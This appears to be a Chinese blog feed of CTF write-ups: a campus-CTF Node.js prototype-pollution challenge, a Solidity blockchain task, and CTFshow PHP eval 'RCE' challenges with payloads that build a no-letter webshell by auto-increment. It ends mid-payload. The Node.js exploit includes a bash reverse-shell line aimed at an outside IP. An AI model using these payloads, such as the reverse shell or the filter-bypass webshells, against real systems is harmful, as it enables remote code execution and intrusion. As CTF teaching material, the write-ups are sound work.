res.send(&#x27;谁说JavaScript不算Java&#x27;));</span><br><span class="line"></span><br><span class="line">let gift = &#123;</span><br><span class="line">    s1: (token)=&gt;&#123; </span><br><span class="line">        return !!token </span><br><span class="line">    &#125;,</span><br><span class="line">    sl: ()=&gt;&#123; </span><br><span class="line">        if (</span><br><span class="line">            JSON.stringify(si).length &gt; 8000) </span><br><span class="line">            si = &#123;&#125; </span><br><span class="line">        &#125;, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let si = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/set&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    gift.sl(); </span><br><span class="line">    const &#123;token, key, val&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token) || !val) return res.send(&quot;what?&quot;); </span><br><span class="line">    si[token][key] = val; </span><br><span class="line">    res.json(&#123; is_succ: true &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/get&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const &#123;token, key&#125; = req.query;</span><br><span class="line">    if (!gift.s1(token)) return res.send(&quot;what?&quot;);</span><br><span class="line">    let result = si[token];</span><br><span class="line">    if (result) result = result[key];</span><br><span class="line">    res.json(&#123; result: result === undefined ? &quot;null&quot; : result, is_succ: result !== undefined &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.put(&#x27;/up&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let date_stream = Buffer.from(JSON.stringify(si)); </span><br><span class="line">    const cmd = gift.redis_set + `date $&#123;date_stream.toString(&#x27;base64&#x27;)&#125;`;</span><br><span class="line">    exec(cmd, (err,_,__) =&gt; &#123;</span><br><span class="line">        if (err) return res.json(&#123; is_succ: false &#125;);</span><br><span class="line">        res.json(&#123; is_succ: true &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(8080, () =&gt; console.log(`谁说JavaScript不算Java`));</span><br></pre></td></tr></table></figure><p>原型链污染，其中的exec存在命令拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    &quot;http://k2p.shenghuo2.top:40046/set?token=__proto__&amp;key=redis_set&amp;val=bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F123.57.236.154%2F9999%200%3E%261&#x27;;&quot;).text)</span><br><span class="line">requests.put(f&quot;http://k2p.shenghuo2.top:40046/up&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008191215353-1700994510650-53.png"></p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><p>准备工作 nc工具  MetaMask  <a href="http://remix.ethereum.org/">remix网站</a></p><p>本题借鉴文章<a href="http://coldwinds5167.github.io/2022/10/Blockchain-solve/">http://coldwinds5167.github.io/2022/10/Blockchain-solve/</a></p><p>先利用题目给了水龙头，创建一个账户</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194559328-1700994510650-52.png"></p><p>根据要求，发多于0.01个测试币注册账号</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194648446-1700994510650-54.png"></p><p>之后访问2（需要手动推出nc重新链接）</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008194728150-1700994510650-57.png" alt="image-20231008194728150"></p><p>提取他给的contrant address</p><p> 0x002C8040CC431dCd9440B966E5A3f63B9ab61F56</p><p>在这之前你需要利用题目给的水龙头和rcp创建钱包账户</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195942763-1700994510650-55.png"></p><p>选中网络</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200011224-1700994510650-56.png"></p><p>之后点添加网络-手动添加网络</p><p><img src="https://raw.githubusercontent.com/qingchuana/img/main/img/image-20231008200126241.png"></p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200158766-1700994510650-59.png"></p><p>之后复制你钱包地址<img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200232881-1700994510650-58.png"></p><p>放到给的水龙头地址</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008200323977-1700994510650-61.png"></p><p>之后你的账户里就有钱了</p><p>之后访问4，得到合约</p><p>pragma solidity 0.8.9;</p><p>contract Greeter {<br>    string greeting;</p><pre><code>constructor(string memory _greeting) &#123;    greeting = _greeting;&#125;function greet() public view returns (string memory) &#123;    return greeting;&#125;function setGreeting(string memory _greeting) public &#123;    greeting = _greeting;&#125;function isSolved() public view returns (bool) &#123;    string memory ctf = &quot;YouAreTheFutur3ofQLNU&quot;;    return keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));&#125;&#125;</code></pre><p>我们这里用到remix</p><p>exp</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    <span class="type">string</span> greeting;</span><br><span class="line"></span><br><span class="line">    constructor(<span class="type">string</span> memory _greeting) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (<span class="type">string</span> memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(<span class="type">string</span> memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (<span class="type">bool</span>) &#123;</span><br><span class="line">        <span class="type">string</span> memory ctf = <span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(ctf)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    address transcation=<span class="number">0xbaed0e840640c1d979ACed1315e14D983808F9F5</span>;<span class="comment">//这里的0x啥对应的是我们前面提取的钱包地址</span></span><br><span class="line">    Greeter target=Greeter(transcation);</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function hack() public returns(<span class="type">bool</span>)&#123;</span><br><span class="line">        <span class="type">bool</span> ans=<span class="literal">false</span>;</span><br><span class="line">        <span class="type">string</span> memory greeting=<span class="string">&quot;YouAreTheFutur3ofQLNU&quot;</span>;</span><br><span class="line">        target.setGreeting(greeting);</span><br><span class="line">        ans=target.isSolved();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195429292-1700994510650-62.png"></p><p>红色的地方要对应起来</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008195603850-1700994510650-60.png"></p><p>先对应第一步，先inject的那个，第二步deploy，之后小狐狸钱包（MetaMask）会弹窗让你确认，等到下面出现绿色对号就可，第三步hack，小狐狸钱包发钱，成功后，回去访问4就可以了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-RCE极限大挑战</title>
      <link href="/2023/10/01/%E5%AE%8F/"/>
      <url>/2023/10/01/%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-RCE极限大挑战"><a href="#CTFshow-RCE极限大挑战" class="headerlink" title="CTFshow-RCE极限大挑战"></a>CTFshow-RCE极限大挑战</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://so.csdn.net/so/search?q=ctfshow&spm=1001.2101.3001.7020">ctfshow</a>出的这五道rce感觉挺好玩的，但自己没做出几道来，所以来详细的复现一下，这几道题基本都是利用的自增，但长度逐渐缩短，雀氏极限。</p><h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看到我们最后执行的是eval，而过滤的只有( 和. ，而php <a href="https://so.csdn.net/so/search?q=eval%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">eval函数</a>的作用是把字符串按照PHP代码来计算，比如果我们写入 echo <code>1</code> 就会写入1 ，如果我们写入的是一句话木马，就可以成功植入木马，执行rce</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><h3 id="code-echo-1-cat-f"><a href="#code-echo-1-cat-f" class="headerlink" title="code=echo ``;&amp;1=cat /f*"></a><code>code=echo ``;&amp;1=cat /f*</code></h3></blockquote><h2 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>基本把能用的都过滤了，只剩下$()_+;[],.&#x3D;&#x2F;字符，p神的文章好早之前就提出过，自增<a href="https://so.csdn.net/so/search?q=rce&spm=1001.2101.3001.7020">rce</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p><p>思路就是，我们rce需要字母，但字母都过滤了，所以我们就要想办法去构造字母，p神是用</p><p>强制连接数组和字符串，数组将被转换成字符串，其值为<code>Array，而我们如果取Array的第[0]</code>个字母的话就是A，而A++就是B，例如：</p><p><img src="/2023/10/01/%E5%AE%8F/image/37853e892a9643ac805787746756841c-1700994174279-21.png"></p><p> 之后我们可以用 . 把字母拼接起来，</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>注释有分解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;  <span class="comment">//得到Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;/&#x27;</span>==<span class="string">&#x27;+&#x27;</span>];   <span class="comment">//让[]里的值报错返回0,取Array[0]=A，此时$_=A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;   <span class="comment">//让$____=_，后面容易拼接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//将A赋给$__</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增到G，此时$__=G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>; <span class="comment">//将_和G拼接起来，此时$____=_G</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;   <span class="comment">//再将$__还原成A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增到E,此时__=E</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//E和_G拼接，此时$____为_GE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;  <span class="comment">//再将__换源成A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;  <span class="comment">//A自增成T此时__=T</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//再拼接成_GET，此时$____=_GET</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$____</span>;   <span class="comment">//为了方便起见，我们把____换成_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="variable">$$_</span>[_])(<span class="variable">$$_</span>[__]);  <span class="comment">//拼成我们想要的($_GET[_])($_GET[__]),传入_和__命令执行即可  </span></span><br></pre></td></tr></table></figure><p>最后换成一行rce即可 </p><h2 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这个过滤和rce2差不多，但吧1和0给放出来了，也限制了长度&lt;&#x3D;105，可以看一下这个文章</p><p><a href="https://blog.csdn.net/rfrder/article/details/119535886">BSides Noida CTF 2021 Web Calculate_bfengj的博客-CSDN博客</a><img src="/2023/10/01/%E5%AE%8F/image/12da9e9234fe43ac8601092b9b0a8d2f-1700994174279-22.png"></p><p>得到NAN再用上面相同的方法获得N,从N开始构造的话长度就比上一个方法少多了，原理还是上一题的自增，试着构造一下，当我是想直接$a[0]的时候，他没有回显，原来是因为现在的NAN还不算字符串,所以后面要在拼接一个例如</p><p><img src="/2023/10/01/%E5%AE%8F/image/96dcc086cb314c4c9a6f2503450c2089-1700994174279-23.png"></p><p>就可以得到我们想要的N了，但我我们需要字母才能构造N，就用上一题同样的方法构造出A来，因为0可以用了，所以我们就不用让报错直接用[0]就可以了</p><p><img src="/2023/10/01/%E5%AE%8F/image/7bbcda92852545ce97dbd2d22b130783-1700994174280-24.png"></p><p>然后我们就可以得到N了</p><p><img src="/2023/10/01/%E5%AE%8F/image/fc6729792a6c44d68b05e5e91c2b82a7-1700994174280-25.png"></p><p>之后再跟上一步一样一步一步自增就可以了</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><p>注释有解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([].[])[<span class="number">0</span>];    <span class="comment">//得到Array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>)[<span class="number">0</span>];   <span class="comment">//__=N</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//O</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;  <span class="comment">//拼接PO</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;  <span class="comment">//S</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 